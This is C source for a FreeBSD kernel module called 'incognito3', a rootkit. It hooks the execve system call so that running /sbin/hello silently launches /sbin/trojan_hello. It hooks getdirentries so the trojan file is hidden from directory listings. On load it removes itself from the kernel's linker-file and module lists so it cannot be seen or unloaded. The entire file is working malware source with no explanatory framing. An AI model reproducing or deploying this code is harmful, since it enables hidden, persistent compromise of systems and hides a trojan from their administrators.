#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <dirent.h>

#define ORIGINAL "/sbin/hello"
#define TROJAN "/sbin/trojan_hello"
#define T_NAME "trojan_hello"
#define VERSION "incognito3.ko"

extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;

struct module {
    TAILQ_ENTRY(module) link;
    TAILQ_ENTRY(module) flink;
    struct linker_file *file;
    int refs;
    int id;
    char *name;
    modeventhand_t handler;
    void *arg;
    modspecific_t data;
};

static int execve_hook(struct thread *td, void *args)
{
    struct execve_args *uap;
    uap = (struct execve_args *)args;

    struct execve_args kernel_ea;
    struct execve_args *user_ea;
    struct vmspace *vm;
    vm_offset_t base, addr;
    char t_fname[] = TROJAN;

    if (strcmp(uap->fname, ORIGINAL) == 0) {
        vm = curthread->td_proc->p_vmspace;
        base = round_page((vm_offset_t) vm->vm_daddr);
        addr = base + ctob(vm->vm_dsize);

        vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
            VM_PROT_ALL, VM_PROT_ALL, 0);

        vm->vm_dsize += btoc(PAGE_SIZE);

        copyout(&t_fname, (char *)addr, strlen(t_fname));
        kernel_ea.fname = (char *)addr;
        kernel_ea.argv = uap->argv;
        kernel_ea.envv = uap->envv;

        user_ea = (struct execve_args *)addr + sizeof(t_fname);
        copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

        return execve(curthread, user_ea);
    }

    return execve(td, args);
}

static int getdirentries_hook(struct thread *td, void *args)
{
    struct getdirentries_args *uap;
    uap = (struct getdirentries_args *)args;

    struct dirent *dp, *current;
    unsigned int size, count;

    getdirentries(td, args);
    size = td->td_retval[0];

    if (size > 0){
        MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
        copyin(uap->buf, dp, size);

        current = dp;
        count = size;

        while ((current->d_reclen != 0) && (count > 0)) {
            count -= current->d_reclen;

            if (strcmp((char*)&current->d_name, T_NAME) == 0) {
                if (count != 0) {
                    bcopy((char *)current + current->d_reclen, current, count);
                }

                size -= current->d_reclen;
                break;
            }

            if (count != 0) {
                current = (struct dirent *)((char *)current
                    + current->d_reclen);
            }
        }

        td->td_retval[0] = size;
        copyout(dp, uap->buf, size);

        FREE(dp, M_TEMP);
    }

    return 0;
}

static int load(struct module *module, int cmd, void *arg)
{
    struct linker_file *lf;
    struct module *mod;

    mtx_lock(&Giant);
    mtx_lock(&kld_mtx);

    (&linker_files)->tqh_first->refs--;

    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, VERSION) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }

    mtx_unlock(&kld_mtx);
    mtx_unlock(&Giant);

    sx_xlock(&modules_sx);

    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, "incognito3") == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }

    sx_xunlock(&modules_sx);

    sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
    sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

    /* TODO, add graceful unload support. */
    return 0;
}

static moduledata_t incognito_mod = {
    "incognito3",
    load,
    NULL
};

DECLARE_MODULE(incognito3, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
